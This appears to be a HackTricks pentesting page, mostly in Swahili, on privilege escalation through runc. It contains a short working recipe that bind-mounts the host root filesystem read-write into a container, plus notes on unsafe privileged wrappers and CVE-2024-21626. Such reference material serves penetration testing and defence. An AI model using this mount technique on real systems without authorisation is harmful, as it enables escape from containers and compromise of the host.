# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za msingi

Ikiwa ungependa kujifunza zaidi kuhusu **runc**, angalia ukurasa ufuatao:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Ikiwa `runc` inapatikana kwa mchakato wa rootful kwenye host, unaweza kutumia OCI bundle ambayo usanidi wake wa mount huweka host `/` kama bind mount ya kujirudia kwenye `/` ndani ya container, na hivyo kufichua mfumo wa faili wa host katika mount namespace hiyo.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> Mtiririko wa `runc run` ulioandikwa unahitaji root: mifano ya runc yenyewe inauita "run as root." Mtumiaji asiye na upendeleo wa root anahitaji usanidi wa rootless kama `runc spec --rootless`, na runc inaeleza kuwa user namespaces lazima ziwe zimewezeshwa kwa hali hiyo.<sup>[[1]](#references)</sup>

## Wrappers zenye upendeleo na matoleo ya runtime

Wrapper yenye upendeleo inayokubali OCI bundle inayodhibitiwa na mtumiaji inaweza kufichua faili za host ikiwa inaruhusu bind mounts zisizo salama. Kagua ikiwa wrapper hutatua traversal na symlinks kabla ya kuthibitisha mount sources na destinations, na ikiwa inaweka vikwazo kwa `process.cwd`. Kanuni ya sudo au `config.json` inayoweza kuandikwa pekee haithibitishi kuwa wrapper itakubali bundle au kuiendesha kwa upendeleo wa host.

Kando na hilo, [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) iliathiri matoleo ya upstream `runc` kuanzia `1.0.0-rc93` hadi `1.1.11`; `1.1.12` ina marekebisho ya upstream. File descriptors zilizovuja na uthibitishaji usiotosha wa working directory zingeweza kusababisha mchakato wa container kuwa nje ya root yake wakati wa baadhi ya workflows za `runc run` au `runc exec`. Nambari za file descriptor hutegemea invocation, na nambari ya toleo haithibitishi uwezekano wa kutumiwa vibaya ikiwa vendor amebandika marekebisho au mtumiaji anayeita hawezi kudhibiti invocation ya runtime yenye upendeleo.

## References

- [1] [runc: Zana ya CLI ya kuanzisha na kuendesha containers](https://github.com/opencontainers/runc#using-runc)
- [2] [Vipimo vya OCI Runtime: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Subtrees za Pamoja](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
